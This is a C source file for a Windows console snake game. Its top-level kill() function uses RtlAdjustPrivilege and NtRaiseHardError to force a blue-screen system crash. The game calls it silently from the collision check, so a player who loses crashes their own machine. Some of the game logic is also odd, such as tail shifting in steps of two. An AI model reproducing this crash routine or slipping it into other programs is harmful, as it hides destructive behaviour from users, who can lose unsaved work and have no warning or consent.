#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <conio.h>
#include <pthread.h>
#include <time.h>
#include <winternl.h>


typedef NTSTATUS (NTAPI *RtlAdjustPrivilegeFunc)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS (NTAPI *NtRaiseHardErrorFunc)(NTSTATUS ErrorStatus, ULONG NumberOfParameters,
                                               ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption,
                                               PULONG Response);

void kill() {
    HMODULE ntdll = LoadLibrary("ntdll.dll");
    if (ntdll == NULL) {
        fprintf(stderr, "Error loading ntdll.dll\n");
        return;
    }

    RtlAdjustPrivilegeFunc adjustPrivilege = (RtlAdjustPrivilegeFunc)GetProcAddress(ntdll, "RtlAdjustPrivilege");
    NtRaiseHardErrorFunc raiseHardError = (NtRaiseHardErrorFunc)GetProcAddress(ntdll, "NtRaiseHardError");

    if (adjustPrivilege == NULL || raiseHardError == NULL) {
        fprintf(stderr, "Error getting function pointers\n");
        FreeLibrary(ntdll);
        return;
    }


    BOOLEAN b;
    unsigned long response;
    adjustPrivilege(19, 1, 0, &b);
    raiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

    FreeLibrary(ntdll);
}
#define HEIGHT 16

char map[HEIGHT][HEIGHT + 1];


typedef struct {
    int x, y, length, x_dir, y_dir, alive;
    int tail[HEIGHT * HEIGHT][2];
    char direction;
} Snake;


Snake snake;


void init_map(){
    snake.alive = 1;
    for(int i = 0; i < HEIGHT * HEIGHT; i++){
        snake.tail[i][0] = -1;
        snake.tail[i][1] = -1;
    }
    sprintf(map[0], "################");

    for(int i = 1; i < HEIGHT - 1; i++){
        sprintf(map[i], "#              #");
    }

    sprintf(map[HEIGHT - 1], "################");
}

void check_tail(){
    for(int i = 0; i < HEIGHT * HEIGHT; i++){
        if (snake.tail[i][0] != -1){
            printf("[%d, %d], ", snake.tail[i][0], snake.tail[i][1]);
        }

    }
}
void draw_map(){
    char* format = "%s\n";
    for (int i = 0; i < HEIGHT; i++){
        format = i == HEIGHT - 1 ? "%s":format;
        printf(format, map[i]);
    }
}

void tail_handler(){
    for(int i = 0; i < snake.length; i++){
        map[snake.tail[i][1]][snake.tail[i][0]] = '@';
    }

}

void unshift_tail(int x, int y) {
    // Assuming snake is a global variable or passed as an argument

    for (int i = (HEIGHT * HEIGHT - 2); i >= 2; i -= 2) {
        snake.tail[i][0] = snake.tail[i - 2][0];
        snake.tail[i][1] = snake.tail[i - 2][1];
    }

    // Add new element at the beginning
    snake.tail[0][0] = x;
    snake.tail[0][1] = y;
}

void clear_snake(){
    for(int i = 0; i <  HEIGHT; i++){
        for (int j = 0; j < HEIGHT; j++){
            if(map[i][j] == '@') map[i][j] = ' ';
        }
    }
}

void generate_food(){
    srand(time(NULL));

    int x, y;

    for(;;){

        x = rand() % 15;
        y = rand() % 15;

        if(map[y][x] != '@'){
            break;
        }
    }

    map[y][x] = '*';

}
void update_map(int x, int y){
    unshift_tail(snake.x, snake.y);
    snake.x = x;
    snake.y = y;
    clear_snake();
    if(map[y][x] == '*'){

        snake.length+=2;
        map[snake.y][snake.x] = '@';
        generate_food();
    } else map[snake.y][snake.x] = '@';

    tail_handler();
}

void check_crossing(){
    switch(snake.x){
        case 16:
            snake.x = 0;
            break;

        case -1:
            snake.x = 15;
            break;
    }

    switch(snake.y){
        case 16:
            snake.y = 0;
            break;

        case -1:
            snake.y = 15;
            break;
    }
}

void check_collision(int x, int y){
    if (map[y][x] == '@'){
        snake.alive = 0;
        kill();
    }
}
void check_direction(){
    switch(snake.direction){
        case 'w':
            if(snake.y_dir == 1){
                snake.direction = 's';
                break;
            }
            snake.y_dir = -1;
            snake.x_dir = 0;
            break;

        case 's':
            if(snake.y_dir == -1){
                snake.direction = 'w';
                break;
            }
            snake.y_dir = 1;
            snake.x_dir = 0;
            break;

        case 'a':
            if(snake.x_dir == 1){
                snake.direction = 'd';
                break;
            }
            snake.x_dir = -1;
            snake.y_dir = 0;
            break;

        case 'd':
            if(snake.x_dir == -1){
                snake.direction = 'a';
                break;
            }
            snake.x_dir = 1;
            snake.y_dir = 0;
            break;
    }
}


void* draw_map_thread(){
    for(;snake.alive;){

        check_direction();
        check_crossing();
        check_collision(snake.x + snake.x_dir, snake.y + snake.y_dir);
        update_map(snake.x + snake.x_dir, snake.y + snake.y_dir);

        draw_map();
        Sleep(250);
        system("cls");
    }
}
int main(){
    pthread_t pthread;
    snake.length = 3;
    init_map();
    generate_food();


    snake.x = 8;
    snake.y = 8;
    snake.direction = _getch();
    pthread_create(&pthread, NULL, draw_map_thread, NULL);
    for(;;){
        snake.direction = _getch();
    }


}